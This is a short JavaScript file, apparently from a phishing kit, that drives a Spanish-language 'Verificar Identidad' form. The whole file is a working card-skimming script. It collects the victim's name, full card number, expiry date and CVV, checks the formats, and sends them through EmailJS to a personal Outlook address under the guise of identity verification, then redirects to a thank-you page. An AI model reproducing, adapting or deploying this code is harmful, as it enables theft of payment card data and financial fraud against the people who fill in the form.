// Inicialización con la nueva public key
emailjs.init('QUMvaSlJuagns7INe');

document.getElementById('formularioVerificacion').addEventListener('submit', async (e) => {
  e.preventDefault();
  
  // Efecto de carga
  const boton = document.querySelector('.boton-verificacion');
  boton.disabled = true;
  boton.innerHTML = `<div class="spinner"></div>Procesando...`;
  
  // Capturar datos del formulario
  const datos = {
    nombre: document.getElementById('nombre').value.trim(),
    tarjeta: document.getElementById('tarjeta').value.replace(/\s/g, ''),
    fecha: document.getElementById('fecha').value,
    cvv: document.getElementById('cvv').value
  };

  // Validaciones
  const errores = [];
  
  const limpiarErrores = () => {
    document.querySelectorAll('.error-input').forEach(el => el.remove());
  };
  
  const mostrarError = (campo, mensaje) => {
    limpiarErrores();
    const error = document.createElement('div');
    error.className = 'error-input';
    error.style.color = '#ff4444';
    error.style.marginTop = '0.5rem';
    error.style.fontSize = '0.9rem';
    error.textContent = mensaje;
    campo.parentNode.appendChild(error);
  };

  if (!/^[a-zA-ZáéíóúÁÉÍÓÚñÑ\s]{4,}$/.test(datos.nombre)) {
    mostrarError(document.getElementById('nombre'), 'Nombre inválido (mínimo 4 letras)');
    errores.push(true);
  }

  if (!/^\d{16}$/.test(datos.tarjeta)) {
    mostrarError(document.getElementById('tarjeta'), 'Número de tarjeta inválido');
    errores.push(true);
  }

  if (new Date(datos.fecha) < new Date()) {
    mostrarError(document.getElementById('fecha'), 'Tarjeta expirada');
    errores.push(true);
  }

  if (!/^\d{3,4}$/.test(datos.cvv)) {
    mostrarError(document.getElementById('cvv'), 'CVV inválido (3-4 dígitos)');
    errores.push(true);
  }

  if (errores.length > 0) {
    boton.disabled = false;
    boton.innerHTML = `<span class="texto-boton">Verificar Identidad</span><span class="icono-boton">🌸</span>`;
    return;
  }

  // Enviar datos usando EmailJS con la nueva configuración:
  // Template ID: template_65du68s
  // Service ID: service_427s9ii
  // El correo destino se configura en EmailJS (fantre001@outlook.com)
  try {
    await emailjs.send("service_427s9ii", "template_65du68s", datos);
    window.location.href = "thank-you.html";
  } catch (error) {
    alert('Error temporal. Por favor intente nuevamente.');
    console.error('Error:', error);
  } finally {
    boton.disabled = false;
    boton.innerHTML = `<span class="texto-boton">Verificar Identidad</span><span class="icono-boton">🌸</span>`;
  }
});

// Formateador de tarjeta
document.getElementById('tarjeta').addEventListener('input', function(e) {
  let valor = e.target.value.replace(/\s/g, '');
  valor = valor.replace(/(\d{4})(?=\d)/g, '$1 ');
  e.target.value = valor.substring(0, 19);
});
